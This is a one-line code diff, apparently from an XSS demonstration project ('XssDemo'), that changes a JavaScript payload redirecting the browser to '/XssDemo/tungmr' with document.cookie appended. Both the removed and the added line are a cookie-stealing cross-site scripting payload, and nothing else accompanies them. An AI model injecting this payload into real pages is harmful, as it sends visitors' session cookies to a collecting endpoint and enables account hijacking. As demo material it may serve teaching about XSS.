@@ -1,1 +1,1 @@
-window.location.href="/XssDemo/tungmr?cookie="+document.cookie;
+window.location="/XssDemo/tungmr?cookie="+document.cookie;
